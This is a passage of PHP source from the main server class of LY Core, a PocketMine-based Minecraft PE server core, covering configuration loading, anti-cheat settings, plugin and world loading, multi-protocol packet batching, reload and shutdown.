  │  LY Core  |  Minecraft PE 服务端核心   │
  ├─────────────────────────────────────┤
  │  构建标签   │ v1.2              │
  │  接口版本   │ API 2.0.0             │
  │  运行时     │ PHP ". PHP_VERSION ." / ".(PHP_INT_SIZE * 8)."bit       │
  │  兼容协议   │ 41~46, 60, 70          │
  │  维护者     │ U core                │
  ╰─────────────────────────────────────╯
  ";

			$this->MapData = new MapData($this, $dataPath);

			$this->about();

			$this->logger->info("正在加载server.yml喵~");
			$configPath = $this->dataPath . "server.yml";
			$requestedLang = $defaultLang !== "unknown" ? $defaultLang : null;
			if(!file_exists($this->dataPath . "server.yml")){
				$content = file_get_contents($this->getPocketMineConfigTemplatePath($requestedLang === null ? BaseLang::FALLBACK_LANGUAGE : $requestedLang));
				if($version->isDev()){
					$content = str_replace("preferred-channel: stable", "preferred-channel: beta", $content);
				}
				@file_put_contents($configPath, $content);
			}
			$this->config = new Config($configPath, Config::YAML, []);
			$nowLang = $this->getProperty("settings.language", "eng");
			if($defaultLang != "unknown" and $nowLang != $defaultLang){
				$this->config->setNested("settings.language", $defaultLang);
				$this->config->save(false);
				unset($this->propertyCache["settings.language"]);
			}
			$this->migratePocketMineConfigTemplate($requestedLang, true);

			$this->logger->info("正在加载lycore.yml喵~");

			$lang = $this->getProperty("settings.language", BaseLang::FALLBACK_LANGUAGE);
			if(file_exists($this->filePath . "src/lycore/resources/lycore_$lang.yml")){
				$content = file_get_contents($file = $this->filePath . "src/lycore/resources/lycore_$lang.yml");
			}else{
				$content = file_get_contents($file = $this->filePath . "src/lycore/resources/lycore_eng.yml");
			}

			$advancedConfigPath = $this->dataPath . "lycore.yml";
			if(!file_exists($advancedConfigPath)){
				@file_put_contents($advancedConfigPath, $content);
			}
			$legacyConfigPath = $this->dataPath . "LY Core.yml";
			$legacyBackupConfigPath = $this->dataPath . "LY Core.yml.bak";
			$this->advancedConfigMigrated = $this->migrateLegacyAdvancedConfig($advancedConfigPath, $legacyConfigPath, $legacyBackupConfigPath);
			$internelConfig = new Config($file, Config::YAML, []);
			$this->advancedConfig = new Config($advancedConfigPath, Config::YAML, []);
			$cfgVer = $this->getAdvancedProperty("config.version", 0, $internelConfig);
			$advVer = $this->getAdvancedProperty("config.version", 0);
			if((int) $cfgVer > (int) $advVer and $this->migrateAdvancedConfigTemplate($advancedConfigPath, $file, true)){
				$this->advancedConfig = new Config($advancedConfigPath, Config::YAML, []);
				$advVer = $this->getAdvancedProperty("config.version", 0);
			}

			$this->loadAdvancedConfig();
			$this->initializeBotStorage();

			if($this->expWriteAhead > 0) $this->generateExpCache($this->expWriteAhead);

			$this->logger->info("正在加载服务器配置喵~");
			$serverPropertiesPath = $this->dataPath . "server.properties";
			$this->ensureServerPropertiesLayout($serverPropertiesPath);
			$this->properties = new Config($serverPropertiesPath, Config::PROPERTIES, [
				"motd" => "LY Core PE 0.14 Server",
				"version-display" => \lycore\MINECRAFT_VERSION_NETWORK,
				"server-port" => 19132,
				"white-list" => false,
				"announce-player-achievements" => true,
				"spawn-protection" => 16,
				"max-players" => 20,
				"allow-flight" => false,
				"spawn-animals" => true,
				"spawn-mobs" => true,
				"gamemode" => 0,
				"force-gamemode" => false,
				"hardcore" => false,
				"pvp" => true,
				"difficulty" => 1,
				"portal-world" => "world",
				"generator-settings" => "",
				"level-name" => "world",
				"level-seed" => "",
				"level-type" => "DEFAULT",
				"enable-query" => true,
				"enable-rcon" => false,
				"rcon.password" => substr(base64_encode(@Utils::getRandomBytes(20, false)), 3, 10),
				"auto-save" => true,
				"protocol-011" => true,
				"protocol-012" => true,
				"protocol-013" => true,
				"protocol-015" => true,
				"use-tnt" => true,
				"adminjoin" => true,
				"player-change-gamemode" => false,
				"player-tp" => false,
				"player-view-list" => false,
				"player-view-plugins" => false,
				"player-list-ops" => false,
				"antifly" => true,
				"antifasteat" => true,
				"antixray" => true,
				"antixray-mode" => AntiXrayObfuscator::MODE_OBFUSCATOR,
				"antixray-scan-chunk-height-limit" => 4,
				"antixray-overworld-fake-block" => Block::STONE,
				"antixray-nether-fake-block" => Block::NETHERRACK,
				"antixray-ores" => implode(",", AntiXrayObfuscator::getDefaultOreIds()),
				"antixray-filters" => implode(",", AntiXrayObfuscator::getDefaultFilterIds()),
				"antixray-worlds" => "world",
				"antixray-memory-cache" => false,
				"antifastbreak" => false,
				"antigamespeed" => true,
				"antitoolbox" => true,
				"netshblock" => stripos(PHP_OS, 'WIN') !== false,
			]);
			$this->loadAntiCheatProperties();
			$this->portalWorldName = trim($this->getConfigString("portal-world", "world"));
			if($this->portalWorldName === ""){
				$this->portalWorldName = "world";
			}

			$this->forceLanguage = $this->getProperty("settings.force-language", false);
			$this->baseLang = new BaseLang($this->getProperty("settings.language", BaseLang::FALLBACK_LANGUAGE));
			$this->logger->info($this->getLanguage()->translateString("language.selected", [$this->getLanguage()->getName(), $this->getLanguage()->getLang()]));

			$this->memoryManager = new MemoryManager($this);

			$this->logger->info($this->getLanguage()->translateString("pocketmine.server.start", [TextFormat::AQUA . $this->getVersion(). TextFormat::WHITE]));

			$poolSize = $this->resolveAsyncWorkerCount($this->getProperty("settings.async-workers", "auto"));
			ServerScheduler::$WORKERS = $poolSize;

			if($this->getProperty("network.batch-threshold", 256) >= 0){
				Network::$BATCH_THRESHOLD = (int) $this->getProperty("network.batch-threshold", 256);
			}else{
				Network::$BATCH_THRESHOLD = -1;
			}
			$this->networkCompressionLevel = $this->getProperty("network.compression-level", 7);
			$this->networkCompressionAsync = $this->getProperty("network.async-compression", true);

			$this->autoTickRate = (bool) $this->getProperty("level-settings.auto-tick-rate", true);
			$this->autoTickRateLimit = (int) $this->getProperty("level-settings.auto-tick-rate-limit", 20);
			$this->alwaysTickPlayers = (int) $this->getProperty("level-settings.always-tick-players", false);
			$this->baseTickRate = (int) $this->getProperty("level-settings.base-tick-rate", 1);

			$this->scheduler = new ServerScheduler();

			if($this->getConfigBoolean("enable-rcon", false) === true){
				$this->rcon = new RCON($this, $this->getConfigString("rcon.password", ""), $this->getConfigInt("rcon.port", $this->getPort()), ($ip = $this->getIp()) != "" ? $ip : "0.0.0.0", $this->getConfigInt("rcon.threads", 1), $this->getConfigInt("rcon.clients-per-thread", 50));
			}

			$this->entityMetadata = new EntityMetadataStore();
			$this->playerMetadata = new PlayerMetadataStore();
			$this->levelMetadata = new LevelMetadataStore();

			$this->operators = new Config($this->dataPath . "ops.txt", Config::ENUM);
			$this->whitelist = new Config($this->dataPath . "white-list.txt", Config::ENUM);
			if(file_exists($this->dataPath . "banned.txt") and !file_exists($this->dataPath . "banned-players.txt")){
				@rename($this->dataPath . "banned.txt", $this->dataPath . "banned-players.txt");
			}
			@touch($this->dataPath . "banned-players.txt");
			$this->banByName = new BanList($this->dataPath . "banned-players.txt");
			$this->banByName->load();
			@touch($this->dataPath . "banned-ips.txt");
			$this->banByIP = new BanList($this->dataPath . "banned-ips.txt");
			$this->banByIP->load();
			@touch($this->dataPath . "banned-cids.txt");
			$this->banByCID = new BanList($this->dataPath . "banned-cids.txt");
			$this->banByCID->load();

			$this->maxPlayers = $this->getConfigInt("max-players", 20);
			$this->setAutoSave($this->getConfigBoolean("auto-save", true));

			if($this->getConfigBoolean("hardcore", false) === true and $this->getDifficulty() < 3){
				$this->setConfigInt("difficulty", 3);
			}

			define("lycore\\DEBUG", (int) $this->getProperty("debug.level", 1));
			if($this->logger instanceof MainLogger){
				$this->logger->setLogDebug(\lycore\DEBUG > 1);
			}

			if(\lycore\DEBUG >= 0){
				@cli_set_process_title($this->getName() . " " . $this->getPocketMineVersion());
			}

			$this->logger->info($this->getLanguage()->translateString("pocketmine.server.networkStart", [$this->getIp() === "" ? "*" : $this->getIp(), $this->getPort()]));
			define("BOOTUP_RANDOM", @Utils::getRandomBytes(16));
			$this->serverID = Utils::getMachineUniqueId($this->getIp() . $this->getPort());

			$this->getLogger()->debug("Server unique id: " . $this->getServerUniqueId());
			$this->getLogger()->debug("Machine unique id: " . Utils::getMachineUniqueId());

			$this->network = new Network($this);
			$this->network->setName(str_replace("\\n", "\n", $this->getMotd()));


			$this->logger->info($this->getLanguage()->translateString("pocketmine.server.info", [
				$this->getName(),
				$this->getPocketMineVersion(),
				$this->getCodename(),
				$this->getApiVersion()
			]));
			$this->logger->info($this->getLanguage()->translateString("pocketmine.server.license", [$this->getName()]));

			Timings::init();

			$this->consoleSender = new ConsoleCommandSender();
			$this->commandMap = new SimpleCommandMap($this);

			$this->registerEntities();
			$this->registerTiles();

			InventoryType::init($this->inventoryNum);
			Block::init();
			Item::init($this->creativeItemsFromJson);
			Biome::init();
			Effect::init();
			Enchantment::init();
			Attribute::init();
			EnchantmentLevelTable::init();
			Color::init();
			TextWrapper::init();//原注释
			$this->craftingManager = new CraftingManager($this->recipesFromJson);

			$this->pluginManager = new PluginManager($this, $this->commandMap);
			$this->pluginManager->subscribeToPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this->consoleSender);
			$this->pluginManager->setUseTimings($this->getProperty("settings.enable-profiling", false));
			$this->profilingTickRate = (float) $this->getProperty("settings.profile-report-trigger", 20);
			$this->pluginManager->registerInterface(PharPluginLoader::class);
			$this->pluginManager->registerInterface(FolderPluginLoader::class);
			$this->pluginManager->registerInterface(ScriptPluginLoader::class);

			//set_exception_handler([$this, "exceptionHandler"]);
			//PHP8 fatal-error recovery locates legacy plugin syntax failures and
			//batch-repairs the plugins directory before crashDump finishes shutdown.
			Php8FatalRecovery::register();
			register_shutdown_function([$this, "crashDump"]);

			$this->queryRegenerateTask = new QueryRegenerateEvent($this, 5);

			$this->network->registerInterface(new RakLibInterface($this));

			PluginSourceCompatibility::warnIfPharReadonlyForDirectory($this->pluginPath, $this->logger);
			$this->pluginManager->loadPlugins($this->pluginPath);

			//If the previous start auto-fixed a plugin's PHP8-incompatible syntax, confirm it now.
			$fixedPlugin = Php8FatalRecovery::consumeMarker();
			if($fixedPlugin !== null){
				$this->logger->notice("上次启动已自动修复插件 " . $fixedPlugin . " 的PHP8不兼容语法，重启后已生效喵~");
			}

			$this->enablePlugins(PluginLoadOrder::STARTUP);

			LevelProviderManager::addProvider($this, Anvil::class);
			LevelProviderManager::addProvider($this, McRegion::class);
			if(extension_loaded("leveldb")){
				$this->logger->notice("喵喵！LevelDB 支持已启用捏");
				LevelProviderManager::addProvider($this, LevelDB::class);
			}


			Generator::addGenerator(Flat::class, "flat");
			Generator::addGenerator(Normal::class, "normal");
			Generator::addGenerator(Normal::class, "default");
			Generator::addGenerator(Nether::class, "hell");
			Generator::addGenerator(Nether::class, "nether");
			Generator::addGenerator(VoidGenerator::class, "void");
			Generator::addGenerator(\lycore\level\generator\ender\Ender::class, "ender");
			Generator::addGenerator(\lycore\level\generator\skyworld\Skyworld::class, "skyworld");
			Generator::addGenerator(\lycore\level\generator\diamonds\diamonds::class, "diamonds");

			foreach((array) $this->getProperty("worlds", []) as $name => $worldSetting){
				if($this->loadLevel($name) === false){
					$seed = $this->getProperty("worlds.$name.seed", time());
					$options = explode(":", $this->getProperty("worlds.$name.generator", Generator::getGenerator("default")));
					$generator = Generator::getGenerator(array_shift($options));
					if(count($options) > 0){
						$options = [
							"preset" => implode(":", $options),
						];
					}else{
						$options = [];
					}

					$this->generateLevel($name, $seed, $generator, $options);
				}
			}

			if($this->getDefaultLevel() === null){
				$default = $this->getConfigString("level-name", "world");
				if(trim($default) == ""){
					$this->getLogger()->warning("level-name cannot be null, using default");
					$default = "world";
					$this->setConfigString("level-name", "world");
				}
				if($this->loadLevel($default) === false){
					$seed = getopt("", ["level-seed::"])["level-seed"] ?? $this->properties->get("level-seed", time());
					if(!is_numeric($seed) or bccomp($seed, "9223372036854775807") > 0){
						$seed = Utils::javaStringHash($seed);
					}elseif(PHP_INT_SIZE === 8){
						$seed = (int) $seed;
					}
					$this->generateLevel($default, $seed === 0 ? time() : $seed);
				}

				$this->setDefaultLevel($this->getLevelByName($default));
			}


			$this->properties->save(true);

			if(!($this->getDefaultLevel() instanceof Level)){
				$this->getLogger()->emergency($this->getLanguage()->translateString("pocketmine.level.defaultError"));
				$this->forceShutdown();

				return;
			}

			if($this->netherEnabled){
				$portalWorld = $this->getPortalWorldName();
				if($portalWorld !== $default and $this->isLevelGenerated($portalWorld)){
					$this->loadLevel($portalWorld);
				}
				if(!$this->loadLevel($this->netherName)){
					//$this->logger->info("正在生成地狱 ".$this->netherName);
					$this->generateLevel($this->netherName, time(), Generator::getGenerator("nether"));
				}
				$this->netherLevel = $this->getLevelByName($this->netherName);
			}
			
			if($this->enderEnabled){
				if(!$this->loadLevel($this->enderName)){
					//$this->logger->info("正在生成末地 ".$this->enderName);
					$this->generateLevel($this->enderName, time(), Generator::getGenerator("ender"));
				}
				$this->enderLevel = $this->getLevelByName($this->enderName);
			}
			
			if($this->skyworldEnabled){
				if(!$this->loadLevel($this->skyworldName)){
					$this->generateLevel($this->skyworldName, time(), Generator::getGenerator("skyworld"));
				}
				$this->skyworldLevel = $this->getLevelByName($this->skyworldName);
			}

			if($this->getProperty("ticks-per.autosave", 6000) > 0){
				$this->autoSaveTicks = (int) $this->getProperty("ticks-per.autosave", 6000);
			}

			$this->enablePlugins(PluginLoadOrder::POSTWORLD);

			if($this->aiEnabled) $this->aiHolder = new AIHolder($this);
			if($this->dserverConfig["enable"] and ($this->getAdvancedProperty("dserver.server-list", "") != "")) $this->scheduler->scheduleRepeatingTask(new CallbackTask([
				$this,
				"updateDServerInfo"
			]), $this->dserverConfig["timer"]);

			if($this->isSynapseEnabled()){
				$this->synapse = new Synapse($this, $this->synapseConfig);
			}

			if($cfgVer != $advVer){
				$this->logger->notice("喵~ 你的lycore.yml有新版本可以升级捏！");
				$this->logger->notice("当前版本喵: $advVer   最新版本喵: $cfgVer");
			}

			$this->generateRecipeList();
			if($this->advancedConfigMigrated){
				$this->logger->notice("已成功把旧配置迁移到LY Core新配置文件喵~");
                $this->logger->notice("反作弊开关已经搬家到server.properties啦，请去那里修改捏");
			}

			$this->start();
		}catch(\Throwable $e){
			$this->exceptionHandler($e);
		}
	}

	/**
	 * @return Synapse
	 */
	public function getSynapse(){
		return $this->synapse;
	}

	//@Deprecated
	public function transferPlayer(Player $player, $address, $port = 19132){
		$ev = new PlayerTransferEvent($player, $address, $port);
	$this->getPluginManager()->callEvent($ev);
	if ($ev->isCancelled()) {
		return false;
	}

	$ip = $this->lookupAddress($ev->getAddress());

	if ($ip === null) {
		return false;
	}

	$packet = new StrangePacket();
	$packet->address = $ip;
	$packet->port = $ev->getPort();
	$player->dataPacket($packet);
	$player->setTransferred($address . ":" . $port);

	return true;
}

public function cleanLookupCache() {
	$this->lookup = [];
}

private function lookupAddress($address) {
	//IP address
	if (preg_match("/^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$/", $address) > 0) {
		return $address;
	}

	$address = strtolower($address);

	if (isset($this->lookup[$address])) {
		return $this->lookup[$address];
	}

	$host = gethostbyname($address);
	if ($host === $address) {
		return null;
	}

	$this->lookup[$address] = $host;
	return $host;
}

	/**
	 * @param string        $message
	 * @param Player[]|null $recipients
	 *
	 * @return int
	 */
	public function broadcastMessage($message, $recipients = null) : int{
		if(!is_array($recipients)){
			return $this->broadcast($message, self::BROADCAST_CHANNEL_USERS);
		}
		
		/** @var Player[] $recipients */
		foreach($recipients as $recipient){
			$recipient->sendMessage($message);
		}

		return count($recipients);
	}

	/**
	 * @param string        $tip
	 * @param Player[]|null $recipients
	 *
	 * @return int
	 */
	public function broadcastTip(string $tip, $recipients = null) : int{
		if(!is_array($recipients)){
			/** @var Player[] $recipients */
			$recipients = [];

			foreach($this->pluginManager->getPermissionSubscriptions(self::BROADCAST_CHANNEL_USERS) as $permissible){
				if($permissible instanceof Player and $permissible->hasPermission(self::BROADCAST_CHANNEL_USERS)){
					$recipients[spl_object_hash($permissible)] = $permissible; // do not send messages directly, or some might be repeated
				}
			}
		}

		/** @var Player[] $recipients */
		foreach($recipients as $recipient){
			$recipient->sendTip($tip);
		}

		return count($recipients);
	}

	/**
	 * @param string        $popup
	 * @param Player[]|null $recipients
	 *
	 * @return int
	 */
	public function broadcastPopup(string $popup, $recipients = null) : int{
		if(!is_array($recipients)){
			/** @var Player[] $recipients */
			$recipients = [];

			foreach($this->pluginManager->getPermissionSubscriptions(self::BROADCAST_CHANNEL_USERS) as $permissible){
				if($permissible instanceof Player and $permissible->hasPermission(self::BROADCAST_CHANNEL_USERS)){
					$recipients[spl_object_hash($permissible)] = $permissible; // do not send messages directly, or some might be repeated
				}
			}
		}

		/** @var Player[] $recipients */
		foreach($recipients as $recipient){
			$recipient->sendPopup($popup);
		}

		return count($recipients);
	}

	/**
	 * @param string $message
	 * @param string $permissions
	 *
	 * @return int
	 */
	public function broadcast($message, string $permissions) : int{
		/** @var CommandSender[] $recipients */
		$recipients = [];
		foreach(explode(";", $permissions) as $permission){
			foreach($this->pluginManager->getPermissionSubscriptions($permission) as $permissible){
				if($permissible instanceof CommandSender and $permissible->hasPermission($permission)){
					$recipients[spl_object_hash($permissible)] = $permissible; // do not send messages directly, or some might be repeated
				}
			}
		}

		foreach($recipients as $recipient){
			$recipient->sendMessage($message);
		}

		return count($recipients);
	}

	/**
	 * Broadcasts a Minecraft packet to a list of players
	 *
	 * @param Player[]   $players
	 * @param DataPacket $packet
	 */
	public static function broadcastPacket(array $players, DataPacket $packet){
		$legacyPlayers = [];
		$players014 = [];
		foreach($players as $player){
			if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $player->getProtocol())){
				$legacyPlayers[] = $player;
			}else{
				$players014[] = $player;
			}
		}

		foreach($legacyPlayers as $player){
			$player->dataPacket($packet);
		}

		if(count($players014) === 0){
			$packet->clearEncapsulatedPacketCache();
			return;
		}

		$packet->encode();
		$packet->isEncoded = true;
		if(Network::$BATCH_THRESHOLD >= 0 and strlen($packet->buffer) >= Network::$BATCH_THRESHOLD){
			Server::getInstance()->batchPackets($players014, [$packet], false);
			$packet->clearEncapsulatedPacketCache();
			return;
		}

		foreach($players014 as $player){
			$player->dataPacket($packet);
		}
		$packet->clearEncapsulatedPacketCache();
	}

	/**
	 * Broadcasts a list of packets in a batch to a list of players
	 *
	 * @param Player[]            $players
	 * @param DataPacket[]|string $packets
	 * @param bool                $forceSync
	 */
	public function batchPackets(array $players, array $packets, $forceSync = false){
		Timings::$playerNetworkTimer->startTiming();
		$str = "";
		$str011 = "";
		$str012 = "";
		$str013 = "";
		$str014 = "";
		$str015 = "";
		$targets = [];
		$targets011 = [];
		$targets012 = [];
		$targets013 = [];
		$targets014 = [];
		$targets015 = [];
		$payloads015 = [];
		$legacyPlayer011 = null;
		$legacyPlayer012 = null;
		$legacyPlayer013 = null;
		$legacyPlayer014 = null;

		foreach($players as $p){
			if($p->isConnected()){
				if(ProtocolCompatibility::isProtocol011((int) $p->getProtocol())){
					$targets011[] = $this->identifiers[spl_object_hash($p)];
					if($legacyPlayer011 === null){
						$legacyPlayer011 = $p;
					}
				}elseif(ProtocolCompatibility::isProtocol012((int) $p->getProtocol())){
					$targets012[] = $this->identifiers[spl_object_hash($p)];
					if($legacyPlayer012 === null){
						$legacyPlayer012 = $p;
					}
				}elseif(ProtocolCompatibility::isProtocol013((int) $p->getProtocol())){
					$targets013[] = $this->identifiers[spl_object_hash($p)];
					if($legacyPlayer013 === null){
						$legacyPlayer013 = $p;
					}
				}elseif(ProtocolCompatibility::isProtocol014((int) $p->getProtocol())){
					$targets014[] = $this->identifiers[spl_object_hash($p)];
					if($legacyPlayer014 === null){
						$legacyPlayer014 = $p;
					}
				}elseif(ProtocolCompatibility::isProtocol015((int) $p->getProtocol())){
					$identifier = $this->identifiers[spl_object_hash($p)];
					$targets015[] = $identifier;
					$payloads015[$identifier] = ["player" => $p, "payload" => ""];
				}else{
					$targets[] = $this->identifiers[spl_object_hash($p)];
				}
			}
		}

		foreach($packets as $p){
			if($p instanceof DataPacketV11){
				if(count($targets011) > 0){
					if(!$p->isEncoded){
						$p->encode();
						$p->isEncoded = true;
					}
					$str011 .= $p->buffer;
				}
			}elseif($p instanceof DataPacketV84){
				if(count($targets015) > 0){
					foreach($payloads015 as $identifier => $target){
						$packet015 = DataPacketManager::parsePacket($target["player"], $p);
						if(!$packet015->isEncoded){
							$packet015->encode();
							$packet015->isEncoded = true;
						}
						$payloads015[$identifier]["payload"] .= Binary::writeInt(strlen($packet015->buffer)) . $packet015->buffer;
					}
				}
			}elseif($p instanceof DataPacket){
				if(count($targets) > 0 and !$p->isEncoded){
					$p->encode();
					$p->isEncoded = true;
				}
				if(count($targets) > 0){
					$str .= Binary::writeInt(strlen($p->buffer)) . $p->buffer;
				}
				if($legacyPlayer011 !== null){
					foreach(DataPacketManager::toProtocol011Packets($p, $legacyPlayer011) as $packet011){
						if(!$packet011->isEncoded){
							$packet011->encode();
							$packet011->isEncoded = true;
						}
						$str011 .= $packet011->buffer;
					}
				}
				if($legacyPlayer012 !== null){
					$legacyPacket012 = $legacyPlayer012->prepareProtocol013OutgoingPacket($p);
					if(!$legacyPacket012->isEncoded){
						$legacyPacket012->encode();
						$legacyPacket012->isEncoded = true;
					}
					$str012 .= Binary::writeInt(strlen($legacyPacket012->buffer)) . $legacyPacket012->buffer;
				}
				if(count($targets015) > 0){
					foreach($payloads015 as $identifier => $target){
						foreach(DataPacketManager::toProtocol015Packets($p, $target["player"]) as $packet015){
							if(!$packet015->isEncoded){
								$packet015->encode();
								$packet015->isEncoded = true;
							}
							$payloads015[$identifier]["payload"] .= Binary::writeInt(strlen($packet015->buffer)) . $packet015->buffer;
						}
					}
				}
				if($legacyPlayer013 !== null){
					$legacyPacket013 = $legacyPlayer013->prepareProtocol013OutgoingPacket($p);
					if(!$legacyPacket013->isEncoded){
						$legacyPacket013->encode();
						$legacyPacket013->isEncoded = true;
					}
					$str013 .= Binary::writeInt(strlen($legacyPacket013->buffer)) . $legacyPacket013->buffer;
				}
				if($legacyPlayer014 !== null){
					$legacyPacket014 = $legacyPlayer014->prepareProtocol013OutgoingPacket($p);
					if(!$legacyPacket014->isEncoded){
						$legacyPacket014->encode();
						$legacyPacket014->isEncoded = true;
					}
					$str014 .= Binary::writeInt(strlen($legacyPacket014->buffer)) . $legacyPacket014->buffer;
				}
			}else{
				if(count($targets) > 0){
					$str .= Binary::writeInt(strlen($p)) . $p;
				}
				if($legacyPlayer011 !== null){
					$str011 .= DataPacketManager::remapPacketBufferToProtocol011($p, $legacyPlayer011);
				}
				if($legacyPlayer012 !== null){
					$legacyBuffer012 = ProtocolCompatibility::remapPacketBufferForProtocol((int) $legacyPlayer012->getProtocol(), $p);
					$str012 .= Binary::writeInt(strlen($legacyBuffer012)) . $legacyBuffer012;
				}
				if(count($targets015) > 0){
					foreach($payloads015 as $identifier => $target){
						$buffer015 = DataPacketManager::remapPacketBufferToProtocol015($p, $target["player"]);
						$payloads015[$identifier]["payload"] .= Binary::writeInt(strlen($buffer015)) . $buffer015;
					}
				}
				if($legacyPlayer013 !== null){
					$legacyBuffer013 = ProtocolCompatibility::remapPacketBufferForProtocol((int) $legacyPlayer013->getProtocol(), $p);
					$str013 .= Binary::writeInt(strlen($legacyBuffer013)) . $legacyBuffer013;
				}
				if($legacyPlayer014 !== null){
					$legacyBuffer014 = ProtocolCompatibility::remapPacketBufferForProtocol((int) $legacyPlayer014->getProtocol(), $p);
					$str014 .= Binary::writeInt(strlen($legacyBuffer014)) . $legacyBuffer014;
				}
			}
		}

		$sendV11Batch = function($payload, array $batchTargets){
			if(count($batchTargets) === 0 or $payload === ""){
				return;
			}

			$compressed = zlib_encode($payload, ZLIB_ENCODING_DEFLATE, $this->networkCompressionLevel);
			if(!is_string($compressed)){
				return;
			}

			$pk = new \lycore\network\protocol\v11\BatchPacket();
			$pk->payload = $compressed;
			$pk->encode();
			$pk->isEncoded = true;

			foreach($batchTargets as $i){
				if(isset($this->players[$i])){
					$this->players[$i]->dataPacketProtocol011($pk);
				}
			}
		};

		$sendBatch = function($payload, array $batchTargets) use ($forceSync){
			if(count($batchTargets) === 0 or $payload === ""){
				return;
			}

			if(!$forceSync and $this->networkCompressionAsync){
				$task = new CompressBatchedTask($payload, $batchTargets, $this->networkCompressionLevel);
				$this->getScheduler()->scheduleAsyncTask($task);
			}else{
				$this->broadcastPacketsCallback(zlib_encode($payload, ZLIB_ENCODING_DEFLATE, $this->networkCompressionLevel), $batchTargets);
			}
		};

		$sendV11Batch($str011, $targets011);
		$sendBatch($str, $targets);
		$sendBatch($str012, $targets012);
		$sendBatch($str013, $targets013);
		$sendBatch($str014, $targets014);
		foreach($payloads015 as $identifier => $target){
			$sendBatch($target["payload"], [$identifier]);
		}

		Timings::$playerNetworkTimer->stopTiming();
	}

	public function broadcastPacketsCallback($data, array $identifiers){
		$pk = new BatchPacket();
		$pk->payload = $data;
		$pk->encode();
		$pk->isEncoded = true;

		foreach($identifiers as $i){
			if(isset($this->players[$i])){
				$this->players[$i]->dataPacket($pk);
			}
		}
	}


	/**
	 * @param int $type
	 */
	public function enablePlugins(int $type){
		foreach($this->pluginManager->getPlugins() as $plugin){
			if(!$plugin->isEnabled() and $plugin->getDescription()->getOrder() === $type){
				$this->enablePlugin($plugin);
			}
		}

		if($type === PluginLoadOrder::POSTWORLD){
			$this->commandMap->registerServerAliases();
			DefaultPermissions::registerCorePermissions();
		}
	}

	/**
	 * @param Plugin $plugin
	 */
	public function enablePlugin(Plugin $plugin){
		$this->pluginManager->enablePlugin($plugin);
	}

	/**
	 * @param Plugin $plugin
	 *
	 * @deprecated
	 */
	public function loadPlugin(Plugin $plugin){
		$this->enablePlugin($plugin);
	}

	public function disablePlugins(){
		$this->pluginManager->disablePlugins();
	}

	public function checkConsole(){
		Timings::$serverCommandTimer->startTiming();
		if(($line = $this->console->getLine()) !== null){
			$this->pluginManager->callEvent($ev = new ServerCommandEvent($this->consoleSender, $line));
			if(!$ev->isCancelled()){
				$this->dispatchCommand($ev->getSender(), $ev->getCommand());
			}
		}
		Timings::$serverCommandTimer->stopTiming();
	}

	/**
	 * Executes a command from a CommandSender
	 *
	 * @param CommandSender $sender
	 * @param string        $commandLine
	 *
	 * @return bool
	 *
	 * @throws \Throwable
	 */
	public function dispatchCommand(CommandSender $sender, $commandLine){
		if(!($sender instanceof CommandSender)){
			throw new ServerException("CommandSender is not valid");
		}

		if($this->commandMap->dispatch($sender, $commandLine)){
			return true;
		}


		$sender->sendMessage(new TranslationContainer(TextFormat::RED . "%commands.generic.notFound"));

		return false;
	}

	public function reload(){
		$this->logger->info("乖乖保存地图中喵~");

		foreach($this->levels as $level){
			$level->save();
		}

		$this->pluginManager->disablePlugins();
		$this->pluginManager->clearPlugins();
		$this->commandMap->clearCommands();

		$this->logger->info("重新读取配置中喵~");
		$this->properties->reload();
		$this->advancedConfig->reload();
		$this->loadAdvancedConfig();
		$this->loadAntiCheatProperties();
		$this->maxPlayers = $this->getConfigInt("max-players", 20);

		if($this->getConfigBoolean("hardcore", false) === true and $this->getDifficulty() < 3){
			$this->setConfigInt("difficulty", 3);
		}

		$this->banByIP->load();
		$this->banByName->load();
		$this->banByCID->load();
		$this->reloadWhitelist();
		$this->operators->reload();

		$this->memoryManager->doObjectCleanup();

		foreach($this->getIPBans()->getEntries() as $entry){
			$this->getNetwork()->blockAddress($entry->getName(), -1);
		}

		$this->pluginManager->registerInterface(PharPluginLoader::class);
		$this->pluginManager->registerInterface(FolderPluginLoader::class);
		$this->pluginManager->registerInterface(ScriptPluginLoader::class);
		$this->pluginManager->loadPlugins($this->pluginPath);
		$this->enablePlugins(PluginLoadOrder::STARTUP);
		$this->enablePlugins(PluginLoadOrder::POSTWORLD);
		TimingsHandler::reload();
	}

	/**
	 * Shutdowns the server correctly
	 * @param bool   $restart
	 * @param string $msg
	 */
	public function shutdown(bool $restart = false, string $msg = ""){
		/*if($this->expEnabled){
			foreach($this->getLevels() as $level){
				foreach($level->getEntities() as $e){
					if($e instanceof ExperienceOrb) $e->close();
				}
			}
		}*/
		/*if($this->isRunning){
			$killer = new ServerKiller(90);
			$killer->start();
			$killer->kill();
		}*/
		$this->isRunning = false;
		if($msg != ""){
			$this->propertyCache["settings.shutdown-message"] = $msg;
		}
	}

	public function forceShutdown(){
		if($this->hasStopped){
			return;
		}

		try{
			if(!$this->isRunning()){
				$this->sendUsage(SendUsageTask::TYPE_CLOSE);
			}

			$this->hasStopped = true;

			$this->shutdown();
			if($this->rcon instanceof RCON){
				$this->rcon->stop();
			}

			if($this->getProperty("network.upnp-forwarding", false) === true){
				$this->logger->info("[UPnP] 正在移除端口转发喵~");
				UPnP::RemovePortForward($this->getPort());
			}

			$this->getLogger()->debug("禁用所有插件");
			$this->pluginManager->disablePlugins();

			foreach($this->players as $player){
				$player->close($player->getLeaveMessage(), $this->getProperty("settings.shutdown-message", "服务器已关闭"));
			}

			$this->getLogger()->debug("卸载所有地图");
			foreach($this->getLevels() as $level){
				$this->unloadLevel($level, true);
			}

			$this->getLogger()->debug("Removing event handlers");
			HandlerList::unregisterAll();

			$this->getLogger()->debug("结束所有进程");
			$this->scheduler->cancelAllTasks();
			$this->scheduler->mainThreadHeartbeat(PHP_INT_MAX);

			$this->getLogger()->debug("保存配置文件");
			$this->properties->save();

			$this->getLogger()->debug("关闭控制台");
			$this->console->shutdown();
			$this->console->notify();

			$this->getLogger()->debug("Stopping network interfaces");
			foreach($this->network->getInterfaces() as $interface){
				$interface->shutdown();
				$this->network->unregisterInterface($interface);
			}

			if($this->isSynapseEnabled()){
				$this->getLogger()->debug("停止 Synapse 客户端");
				$this->synapse->shutdown();
			}

			//$this->memoryManager->doObjectCleanup();

			gc_collect_cycles();
		}catch(\Throwable $e){
			$this->logger->logException($e);
